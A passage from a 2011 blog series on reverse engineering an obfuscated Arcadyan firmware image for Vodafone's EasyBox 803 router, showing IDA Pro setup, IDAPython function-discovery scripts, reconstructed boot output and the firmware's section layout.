If you load the binary at <code>0x0</code> and make a function at <code>0x0</code> (&#8216;p&#8217;) you will see a function which is responsible for CPU initialization. When looking further down you will see the following code:<br />
<img data-attachment-id="58" data-permalink="https://sviehb.wordpress.com/2011/09/09/reverse-engineering-an-obfuscated-firmware-image-e02-analysis/zero_bss/" data-orig-file="https://sviehb.files.wordpress.com/2011/09/zero_bss.png?w=213&#038;h=316" data-orig-size="213,316" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="zero_bss" data-image-description="" data-medium-file="https://sviehb.files.wordpress.com/2011/09/zero_bss.png?w=213&#038;h=316?w=202" data-large-file="https://sviehb.files.wordpress.com/2011/09/zero_bss.png?w=213&#038;h=316?w=213" class="alignnone size-full wp-image-58" title="zero_bss" src="https://sviehb.files.wordpress.com/2011/09/zero_bss.png?w=213&#038;h=316" alt="" width="213" height="316" srcset="https://sviehb.files.wordpress.com/2011/09/zero_bss.png 213w, https://sviehb.files.wordpress.com/2011/09/zero_bss.png?w=101&amp;h=150 101w" sizes="(max-width: 213px) 100vw, 213px" /></p>
<p>As you can see it is zeroing out the memory between <code>0x808425E8</code> and <code>0x83467160</code>. This indicates that it is setting up the .bss segment which usually comes right after the data segment.<br />
If you would subtract the size of our input file (<code>0x008405E3</code> bytes) from <code>0x808425E8</code> you would also get <code>0x80002000</code> (<code>0x80002005</code> actually, but consider the rest alignment/padding).</p>
<p>Right after this code above we get another important information &#8211; the value of the $gp (global) pointer. This (static) pointer is frequently used for addressing data later on.<br />
<img data-attachment-id="61" data-permalink="https://sviehb.wordpress.com/2011/09/09/reverse-engineering-an-obfuscated-firmware-image-e02-analysis/gp/" data-orig-file="https://sviehb.files.wordpress.com/2011/09/gp.png?w=378&#038;h=30" data-orig-size="378,30" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="gp" data-image-description="" data-medium-file="https://sviehb.files.wordpress.com/2011/09/gp.png?w=378&#038;h=30?w=300" data-large-file="https://sviehb.files.wordpress.com/2011/09/gp.png?w=378&#038;h=30?w=378" class="alignnone size-full wp-image-61" title="gp" src="https://sviehb.files.wordpress.com/2011/09/gp.png?w=378&#038;h=30" alt="" width="378" height="30" srcset="https://sviehb.files.wordpress.com/2011/09/gp.png 378w, https://sviehb.files.wordpress.com/2011/09/gp.png?w=150&amp;h=12 150w, https://sviehb.files.wordpress.com/2011/09/gp.png?w=300&amp;h=24 300w" sizes="(max-width: 378px) 100vw, 378px" /></p>
<p>Now it&#8217;s time to load out file into IDA properly.</p>
<p>File &gt; Load<br />
Processor type: &#8220;MIPS series: mipsb&#8221;<br />
<img data-attachment-id="62" data-permalink="https://sviehb.wordpress.com/2011/09/09/reverse-engineering-an-obfuscated-firmware-image-e02-analysis/ida_load/" data-orig-file="https://sviehb.files.wordpress.com/2011/09/ida_load.png?w=341&#038;h=480" data-orig-size="341,480" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="ida_load" data-image-description="" data-medium-file="https://sviehb.files.wordpress.com/2011/09/ida_load.png?w=341&#038;h=480?w=213" data-large-file="https://sviehb.files.wordpress.com/2011/09/ida_load.png?w=341&#038;h=480?w=341" class="alignnone size-full wp-image-62" title="ida_load" src="https://sviehb.files.wordpress.com/2011/09/ida_load.png?w=341&#038;h=480" alt="" width="341" height="480" srcset="https://sviehb.files.wordpress.com/2011/09/ida_load.png 341w, https://sviehb.files.wordpress.com/2011/09/ida_load.png?w=107&amp;h=150 107w, https://sviehb.files.wordpress.com/2011/09/ida_load.png?w=213&amp;h=300 213w" sizes="(max-width: 341px) 100vw, 341px" /></p>
<p>Options &gt; General &gt; Analysis &gt; Processor specific analysis options<br />
<img data-attachment-id="63" data-permalink="https://sviehb.wordpress.com/2011/09/09/reverse-engineering-an-obfuscated-firmware-image-e02-analysis/ida_gp/" data-orig-file="https://sviehb.files.wordpress.com/2011/09/ida_gp.png?w=307&#038;h=395" data-orig-size="307,395" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="ida_gp" data-image-description="" data-medium-file="https://sviehb.files.wordpress.com/2011/09/ida_gp.png?w=307&#038;h=395?w=233" data-large-file="https://sviehb.files.wordpress.com/2011/09/ida_gp.png?w=307&#038;h=395?w=307" class="alignnone size-full wp-image-63" title="ida_gp" src="https://sviehb.files.wordpress.com/2011/09/ida_gp.png?w=307&#038;h=395" alt="" width="307" height="395" srcset="https://sviehb.files.wordpress.com/2011/09/ida_gp.png 307w, https://sviehb.files.wordpress.com/2011/09/ida_gp.png?w=117&amp;h=150 117w, https://sviehb.files.wordpress.com/2011/09/ida_gp.png?w=233&amp;h=300 233w" sizes="(max-width: 307px) 100vw, 307px" /></p>
<p>Now start the auto-analysis by pressing &#8216;p&#8217; or &#8216;c&#8217; at <code>0x80002000</code>.<br />
IDA does a reasonably good job at analyzing the file:<br />
<img data-attachment-id="64" data-permalink="https://sviehb.wordpress.com/2011/09/09/reverse-engineering-an-obfuscated-firmware-image-e02-analysis/ida_analysis/" data-orig-file="https://sviehb.files.wordpress.com/2011/09/ida_analysis.png?w=530&#038;h=55" data-orig-size="530,55" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="ida_analysis" data-image-description="" data-medium-file="https://sviehb.files.wordpress.com/2011/09/ida_analysis.png?w=530&#038;h=55?w=300" data-large-file="https://sviehb.files.wordpress.com/2011/09/ida_analysis.png?w=530&#038;h=55?w=530" class="alignnone size-full wp-image-64" title="ida_analysis" src="https://sviehb.files.wordpress.com/2011/09/ida_analysis.png?w=530&#038;h=55" alt="" width="530" height="55" srcset="https://sviehb.files.wordpress.com/2011/09/ida_analysis.png 530w, https://sviehb.files.wordpress.com/2011/09/ida_analysis.png?w=150&amp;h=16 150w, https://sviehb.files.wordpress.com/2011/09/ida_analysis.png?w=300&amp;h=31 300w" sizes="(max-width: 530px) 100vw, 530px" /></p>
<p>String references match nicely too:<br />
<img data-attachment-id="66" data-permalink="https://sviehb.wordpress.com/2011/09/09/reverse-engineering-an-obfuscated-firmware-image-e02-analysis/ida_str_ref/" data-orig-file="https://sviehb.files.wordpress.com/2011/09/ida_str_ref.png?w=696&#038;h=360" data-orig-size="696,360" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="ida_str_ref" data-image-description="" data-medium-file="https://sviehb.files.wordpress.com/2011/09/ida_str_ref.png?w=696&#038;h=360?w=300" data-large-file="https://sviehb.files.wordpress.com/2011/09/ida_str_ref.png?w=696&#038;h=360?w=696" class="alignnone size-full wp-image-66" title="ida_str_ref" src="https://sviehb.files.wordpress.com/2011/09/ida_str_ref.png?w=696&#038;h=360" alt="" width="696" height="360" srcset="https://sviehb.files.wordpress.com/2011/09/ida_str_ref.png 696w, https://sviehb.files.wordpress.com/2011/09/ida_str_ref.png?w=150&amp;h=78 150w, https://sviehb.files.wordpress.com/2011/09/ida_str_ref.png?w=300&amp;h=155 300w" sizes="(max-width: 696px) 100vw, 696px" /></p>
<p>We will help IDA to analyze the binary further by running this IDAPython script (end of CODE is at <code>0x805F0520</code>!):</p>
<pre class="brush: python; title: ; notranslate" title="">
def analyze_addiu_sp(curr_addr,end_addr):
        addiu = &quot;27 BD&quot; # 27 BD XX XX addiu  $sp, immediate
        n = 0
        if curr_addr &lt; end_addr:
                print &quot;mipsb addiu function search between: 0x%X and 0x%x&quot; % (curr_addr,end_addr)

                while curr_addr &lt; end_addr and curr_addr != BADADDR:
                    curr_addr = FindBinary(curr_addr, SEARCH_DOWN, addiu)

                    if GetFunctionAttr(curr_addr,FUNCATTR_START) == BADADDR and curr_addr != BADADDR and curr_addr &lt; end_addr  and curr_addr % 4 == 0:
                        immediate = int(GetManyBytes(curr_addr+2, 2, False).encode('hex'),16)
                        #Jump(curr_addr) # useful for debugging, but has performance impact
                        if immediate &amp; 0x8000: # check if most sigificant bit is set -&gt; $sp -0x1
                                if MakeFunction(curr_addr):
                                    n += 1
                                else:
                                    print 'MakeFunction(0x%x) failed - running 2nd time maybe fixes this' % curr_addr
                    curr_addr += 1

                print &quot;Created %d new functions\n&quot; % n
                return n
        else:
                print &quot;Invalid end address of CODE segment!&quot;

curr_addr = ScreenEA() &amp; 0xFFFFFFFC # makes sure start address is 4-byte aligned
end_addr = AskAddr(0, &quot;Enter end address of CODE segment.&quot;)
analyze_addiu_sp(curr_addr,end_addr)
</pre>
<p>Note: If you get &#8220;MakeFunction(<code>0x80057600</code>) failed&#8221;-errors, wait for IDA to complete its analysis and run a 2nd time.<br />
This script takes advantage of the fact that each function (which uses stack) has an <strong>addiu $sp -immediate</strong> instruction the beginning of its epilogue. (Of course this may not be the case with other compilers!)</p>
<p>Now we will run a second script to convert the rest (=unexplored stuff) to functions (or at least code).</p>
<pre class="brush: python; title: ; notranslate" title="">
def analyze_unexplored(curr_addr,end_addr):
        if curr_addr &lt; end_addr:
                print &quot;unexplored function and code search between: 0x%X and 0x%x&quot; % (curr_addr,end_addr)

                while curr_addr &lt; end_addr and curr_addr != BADADDR:
                    curr_addr = FindUnexplored(curr_addr,SEARCH_DOWN)
                    #Jump(curr_addr) # useful for debugging, but has performance impact
                    if curr_addr != BADADDR and curr_addr &lt; end_addr and curr_addr % 4 == 0:
                            MakeFunction(curr_addr)
                print 'done!'
        else:
                print &quot;Invalid end address of CODE segment!&quot;

curr_addr = ScreenEA() &amp; 0xFFFFFFFC # makes sure start address is 4-byte aligned
end_addr = AskAddr(0, &quot;Enter end address of CODE segment.&quot;)
analyze_unexplored(curr_addr,end_addr)
</pre>
<p>This script only works properly because there is not data inlined in the code segment. If that wouldn&#8217;t be the case you would get false positives (eg. code that is actually data).</p>
<p>Let&#8217;s create a new segment with the information we gathered earlier (alternatively we could just make the ROM segment bigger):<br />
<img data-attachment-id="79" data-permalink="https://sviehb.wordpress.com/2011/09/09/reverse-engineering-an-obfuscated-firmware-image-e02-analysis/seg_bss/" data-orig-file="https://sviehb.files.wordpress.com/2011/09/seg_bss.png?w=275&#038;h=332" data-orig-size="275,332" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="seg_bss" data-image-description="" data-medium-file="https://sviehb.files.wordpress.com/2011/09/seg_bss.png?w=275&#038;h=332?w=248" data-large-file="https://sviehb.files.wordpress.com/2011/09/seg_bss.png?w=275&#038;h=332?w=275" class="alignnone size-full wp-image-79" title="seg_bss" src="https://sviehb.files.wordpress.com/2011/09/seg_bss.png?w=275&#038;h=332" alt="" width="275" height="332" srcset="https://sviehb.files.wordpress.com/2011/09/seg_bss.png 275w, https://sviehb.files.wordpress.com/2011/09/seg_bss.png?w=124&amp;h=150 124w" sizes="(max-width: 275px) 100vw, 275px" /></p>
<p>Note: .bss is apparently also used as stack (with $sp pointing to <code>0x83467160</code> initially) so the segment does not have to be this big to get all the references to data.<br />
Note²: IDA fails to display all the xrefs to the new segment &#8211; Reanalyzing does the trick (Options &gt; General &gt; Analysis &gt; Reanalyze program)</p>
<p>The first function that gets called from the entry function has a reference to the string &#8220;\nIn c_entry() function &#8230;\n&#8221;.<br />
<img data-attachment-id="82" data-permalink="https://sviehb.wordpress.com/2011/09/09/reverse-engineering-an-obfuscated-firmware-image-e02-analysis/c_entry/" data-orig-file="https://sviehb.files.wordpress.com/2011/09/c_entry.png?w=598&#038;h=46" data-orig-size="598,46" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="c_entry" data-image-description="" data-medium-file="https://sviehb.files.wordpress.com/2011/09/c_entry.png?w=598&#038;h=46?w=300" data-large-file="https://sviehb.files.wordpress.com/2011/09/c_entry.png?w=598&#038;h=46?w=598" class="alignnone size-full wp-image-82" title="c_entry" src="https://sviehb.files.wordpress.com/2011/09/c_entry.png?w=598&#038;h=46" alt="" width="598" height="46" srcset="https://sviehb.files.wordpress.com/2011/09/c_entry.png 598w, https://sviehb.files.wordpress.com/2011/09/c_entry.png?w=150&amp;h=12 150w, https://sviehb.files.wordpress.com/2011/09/c_entry.png?w=300&amp;h=23 300w" sizes="(max-width: 598px) 100vw, 598px" /><br />
If you <a href="http://www.google.at/#q=%22In+c_entry()+function+...%22" target="_blank">Google</a> for this you will find logs posted by people who attached a serial cable to their Arcadyan devices and read what the device prints during boot.</p>
<p>Quote from <a href="http://comments.gmane.org/gmane.comp.embedded.openwrt.devel/4096" target="_blank">http://comments.gmane.org/gmane.comp.embedded.openwrt.devel/4096</a>:</p>
<pre>In c_entry() function ...
install_exception
Co config = 80008483
[INIT] Interrupt ...
##### _ftext      = 0x80002000
##### _fdata      = 0x805BC0E0
##### __bss_start = 0x80663F44
##### end         = 0x81B8C09C
allocate_memory_after_end&gt; len 687716, ptr 0x81b940a0
##### Backup Data from 0x805BC0E0 to 0x81B9409C~0x81C3BF00 len 687716
##### Backup Data completed
##### Backup Data verified
...</pre>
<p>It would be nice to have this information for our device too, so let&#8217;s find the function that prints this and then reconstruct its output:<br />
<img data-attachment-id="87" data-permalink="https://sviehb.wordpress.com/2011/09/09/reverse-engineering-an-obfuscated-firmware-image-e02-analysis/print_seg-2/" data-orig-file="https://sviehb.files.wordpress.com/2011/09/print_seg1.png?w=749&#038;h=481" data-orig-size="749,481" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="print_seg" data-image-description="" data-medium-file="https://sviehb.files.wordpress.com/2011/09/print_seg1.png?w=749&#038;h=481?w=300" data-large-file="https://sviehb.files.wordpress.com/2011/09/print_seg1.png?w=749&#038;h=481?w=749" class="alignnone size-full wp-image-87" title="print_seg" src="https://sviehb.files.wordpress.com/2011/09/print_seg1.png?w=749&#038;h=481" alt="" width="749" height="481" srcset="https://sviehb.files.wordpress.com/2011/09/print_seg1.png 749w, https://sviehb.files.wordpress.com/2011/09/print_seg1.png?w=150&amp;h=96 150w, https://sviehb.files.wordpress.com/2011/09/print_seg1.png?w=300&amp;h=193 300w" sizes="(max-width: 749px) 100vw, 749px" /></p>
<p>Output (if I&#8217;m correct):</p>
<pre>##### _ftext      = 0x80002000
##### _fdata      = 0x807989C0
##### __bss_start = 0x8083F2A0
##### __bss_end   = 0x83467160
allocate_memory_after_end&gt; len %d, ptr 0x8346F160
##### Backup Data from 0x807989C0 to 0x8346F160~0x83515A40 len 682208</pre>
<p>We can now add another segment (backup_data).</p>
<p>When we search for &#8216;all error operands&#8217; a lot of entries will show up. From the IDA Pro Documentation:</p>
<blockquote><p>This commands searches for the &#8216;error&#8217; operands. Usually, these operands are displayed with a red color.<br />
Below is the list of probable causes of error operands:</p>
<pre>        - reference to an unexisting address
        - illegal offset base
        - unprintable character constant
        - invalid structure or enum reference
        - and so on...</pre>
</blockquote>
<p>We are only interested in the &#8220;reference to an unexisting address&#8221;-type.<br />
The <strong>lui</strong> instructions before the error operands reveal where new segments should be added.<br />
<img data-attachment-id="132" data-permalink="https://sviehb.wordpress.com/2011/09/09/reverse-engineering-an-obfuscated-firmware-image-e02-analysis/error_operand/" data-orig-file="https://sviehb.files.wordpress.com/2011/09/error_operand.png?w=391&#038;h=90" data-orig-size="391,90" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="error_operand" data-image-description="" data-medium-file="https://sviehb.files.wordpress.com/2011/09/error_operand.png?w=391&#038;h=90?w=300" data-large-file="https://sviehb.files.wordpress.com/2011/09/error_operand.png?w=391&#038;h=90?w=391" class="alignnone size-full wp-image-132" title="error_operand" src="https://sviehb.files.wordpress.com/2011/09/error_operand.png?w=391&#038;h=90" alt="" width="391" height="90" srcset="https://sviehb.files.wordpress.com/2011/09/error_operand.png 391w, https://sviehb.files.wordpress.com/2011/09/error_operand.png?w=150&amp;h=35 150w, https://sviehb.files.wordpress.com/2011/09/error_operand.png?w=300&amp;h=69 300w" sizes="(max-width: 391px) 100vw, 391px" /><br />
This would tell us that we have to add a segment at <code>0xBE100000</code> (size at least <code>0xFFFF</code>)<br />
Alternatively can search for text &#8220;<strong>lui</strong>&#8220;. If the (second) operand&lt;&lt;16 is not part of an existing segment, check if the register (first operand) is used for addressing data, if it is, add a new segment accordingly.</p>
<p>I think missing segments are (as always, I could be wrong) device memory  and are not terribly interesting to me. For the sake of completeness I added them.<br />
<img data-attachment-id="93" data-permalink="https://sviehb.wordpress.com/2011/09/09/reverse-engineering-an-obfuscated-firmware-image-e02-analysis/segments-2/" data-orig-file="https://sviehb.files.wordpress.com/2011/09/segments1.png?w=886&#038;h=209" data-orig-size="886,209" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="segments" data-image-description="" data-medium-file="https://sviehb.files.wordpress.com/2011/09/segments1.png?w=886&#038;h=209?w=300" data-large-file="https://sviehb.files.wordpress.com/2011/09/segments1.png?w=886&#038;h=209?w=886" class="alignnone size-full wp-image-93" title="segments" src="https://sviehb.files.wordpress.com/2011/09/segments1.png?w=886&#038;h=209" alt="" width="886" height="209" srcset="https://sviehb.files.wordpress.com/2011/09/segments1.png 886w, https://sviehb.files.wordpress.com/2011/09/segments1.png?w=150&amp;h=35 150w, https://sviehb.files.wordpress.com/2011/09/segments1.png?w=300&amp;h=71 300w, https://sviehb.files.wordpress.com/2011/09/segments1.png?w=768&amp;h=181 768w" sizes="(max-width: 886px) 100vw, 886px" /></p>
<p>Continued in E03: Reverse engineering an obfuscated firmware image &#8211; MIPS ASM (&#8220;maybe, sometime&#8221;)</p>
<p>Note: The IDAPython scripts are based on Craig Heffner&#8217;s <a href="http://www.devttys0.com/wp-content/uploads/2011/07/ida_scripts.zip" target="_blank">work</a> over at <a href="http://www.devttys0.com/" target="_blank">/dev/ttyS0</a> &#8211; reccomended:<a href="http://www.devttys0.com/2011/07/reverse-engineering-vxworks-firmware-wrt54gv8/" target="_blank">Reverse Engineering VxWorks Firmware: WRT54Gv8</a><br />
Note²: Make sure to comply with <a href="http://dsl.vodafone.de/hilfe/download.php?id=9999&amp;hoehe_box=1000" target="_blank">Vodafone&#8217;s terms of use</a>.</p>
	</div>

	<div class="feedback">
                        <a href="https://sviehb.wordpress.com/2011/09/09/reverse-engineering-an-obfuscated-firmware-image-e02-analysis/#comments">Comments (7)</a>	</div>

</div>



<h2>September 6, 2011</h2>
<div class="post-4 post type-post status-publish format-standard hentry category-uncategorized tag-arcadyan-2 tag-arcor tag-fdd tag-mips tag-re-2" id="post-4">
	 <h3 class="storytitle">
			<a href="https://sviehb.wordpress.com/2011/09/06/reverse-engineering-an-obfuscated-firmware-image-e01-unpacking/" rel="bookmark">Reverse engineering an obfuscated firmware image E01 &#8211;&nbsp;unpacking</a>
		 </h3>
	<div class="meta">Filed under:  <a href="https://sviehb.wordpress.com/category/uncategorized/" rel="category tag">Uncategorized</a> &#8212; Stefan @ 10:38 am <br />Tags: <a href="https://sviehb.wordpress.com/tag/arcadyan-2/" rel="tag">arcadyan</a>, <a href="https://sviehb.wordpress.com/tag/arcor/" rel="tag">arcor</a>, <a href="https://sviehb.wordpress.com/tag/fdd/" rel="tag">fdd</a>, <a href="https://sviehb.wordpress.com/tag/mips/" rel="tag">mips</a>, <a href="https://sviehb.wordpress.com/tag/re-2/" rel="tag">re</a><br /></div>

	<div class="storycontent">
		<p>When reverse engineering Linux-based firmware images the following methodology usually works pretty well:</p>
<ol>
<li>use <a href="http://code.google.com/p/binwalk/">Binwalk</a> to identify different parts of a firmware image by their magic signatures</li>
<li>use dd to split the firmware image apart</li>
<li>unpack parts / mount/extract the filesystem(s)</li>
<li>find interesting config files/binaries</li>
<li>load ELF binaries into your favorite disassembler</li>
<li>start looking at beautiful MIPS/ARM/PPC ASM</li>
</ol>
<p>This approach unfortunately didn&#8217;t work when I looked at firmware images for a broadband router called &#8216;EasyBox 803&#8217; distributed by Vodafone Germany (formerly Arcor). Apart from two LZMA-packed segments containing information irrelevant for my research didn&#8217;t find anything useful in the firmware image at first.<br />
As I had to confirm a major vulnerability (default WPA keys based on ESSID/BSSID [<a href="http://www.golem.de/1108/85863.html" target="_blank">1</a>][<a href="http://www.heise.de/security/meldung/Vorkonfigurierte-WPA-Schluessel-bei-T-Online-und-Vodafone-leicht-erratbar-1326796.html" target="_blank">2</a>]) I didn&#8217;t give up at this point. But let&#8217;s start right at the beginning &#8230;</p>
<p><img data-attachment-id="45" data-permalink="https://sviehb.wordpress.com/2011/09/06/reverse-engineering-an-obfuscated-firmware-image-e01-unpacking/vodafone_803/" data-orig-file="https://sviehb.files.wordpress.com/2011/09/vodafone_803.png?w=577&#038;h=368" data-orig-size="577,368" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="vodafone_803" data-image-description="" data-medium-file="https://sviehb.files.wordpress.com/2011/09/vodafone_803.png?w=577&#038;h=368?w=300" data-large-file="https://sviehb.files.wordpress.com/2011/09/vodafone_803.png?w=577&#038;h=368?w=577" class="alignnone size-full wp-image-45" title="vodafone_803" src="https://sviehb.files.wordpress.com/2011/09/vodafone_803.png?w=577&#038;h=368" alt="" width="577" height="368" srcset="https://sviehb.files.wordpress.com/2011/09/vodafone_803.png 577w, https://sviehb.files.wordpress.com/2011/09/vodafone_803.png?w=150&amp;h=96 150w, https://sviehb.files.wordpress.com/2011/09/vodafone_803.png?w=300&amp;h=191 300w" sizes="(max-width: 577px) 100vw, 577px" /></p>
<p>I obtained a <a href="http://dsl.vodafone.de/hilfe/files/vfksc/pdf/dsl_803_752DPW_FW_30.05.211.bin" target="_blank">firmware update file</a> for the EasyBox 803 from Vodafone&#8217;s <a href="http://dsl.vodafone.de/hilfe/index.php?sid=&amp;aktion=anzeigen&amp;rubrik=004018153&amp;id=3081#divTab3" target="_blank">support page</a>. A Google search reveals the following:</p>
<ul>
<li>the device is manufactured by <a href="http://www.astorianetworks.com/" target="_blank">Astoria Networks</a>, which is the German subsidiary of the Taiwanese company <a href="http://arcadyan.com.tw" target="_blank">Arcadyan</a></li>
<li>there are tools available for unpacking Arcadyan firmware (<a href="http://www.kessler-design.com/speedport-w700v/firmware.html" target="_blank">SP700EX</a>, <a href="http://www.ip-phone-forum.de/showthread.php?t=211537&amp;p=1700608&amp;viewfull=1#post1700608" target="_blank">arcadyan_dec</a>)</li>
<li>Arcadyan uses obfuscation (xor, swapping bits/bytes/blocks) to thwart analysis of their firmware files</li>
<li>Arcadyan devices don&#8217;t run Linux, instead they have their own proprietary OS</li>
<li>MIPS big endian is their preferred architecture</li>
</ul>
<p>I tried to unpack the firmware file with the tools I found, but although they can deobfuscate the firmware of other Arcadyan devices, they could not do the same for mine. Nevertheless the tools helped me in understanding the layout of my firmware image. It basically consists of several sections which are concatenated. From a high-level view a section looks like this:</p>
<p><img data-attachment-id="10" data-permalink="https://sviehb.wordpress.com/2011/09/06/reverse-engineering-an-obfuscated-firmware-image-e01-unpacking/arcadyan_section/" data-orig-file="https://sviehb.files.wordpress.com/2011/09/arcadyan_section.png?w=600&#038;h=202" data-orig-size="600,202" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="arcadyan section" data-image-description="" data-medium-file="https://sviehb.files.wordpress.com/2011/09/arcadyan_section.png?w=600&#038;h=202?w=300" data-large-file="https://sviehb.files.wordpress.com/2011/09/arcadyan_section.png?w=600&#038;h=202?w=600" class="alignnone size-full wp-image-10" title="arcadyan section" src="https://sviehb.files.wordpress.com/2011/09/arcadyan_section.png?w=600&#038;h=202" alt="arcadyan section layout info" width="600" height="202" srcset="https://sviehb.files.wordpress.com/2011/09/arcadyan_section.png 600w, https://sviehb.files.wordpress.com/2011/09/arcadyan_section.png?w=150&amp;h=51 150w, https://sviehb.files.wordpress.com/2011/09/arcadyan_section.png?w=300&amp;h=101 300w" sizes="(max-width: 600px) 100vw, 600px" /></p>
<pre>(relevant words marked with '||')
beginning of section:
00000000h:|32 54 76 98|11 AF 99 D3 AC FF EA 6C 43 62 39 C8 ; 2Tv˜.¯™Ó¬ÿêlCb9È
...
end of data:
001e83a0h: 0C D8 A3 4A|CD AB 89 67|EE 50 66 2C 53 00 15 93 ; .Ø£JÍ«‰gîPf,S..“
...
end of section:
001e83e0h: 0A 01 EF 8A 73 58 DE 85 00 00 00 00|FF FF FF FF|; ..ïŠsXÞ…....ÿÿÿÿ
001e83f0h:|FF FF FF FF|A4 83 1E 00|78 56 34 12|5E E2 53 5F|; ÿÿÿÿ¤ƒ..xV4.^âS_
beginning of next section:
001e8400h:|32 54 76 98|82 FF 4D 9D CF 6A 95 5E B0 5C 96 7F ; 2Tv˜‚ÿMÏj•^°\–
...</pre>
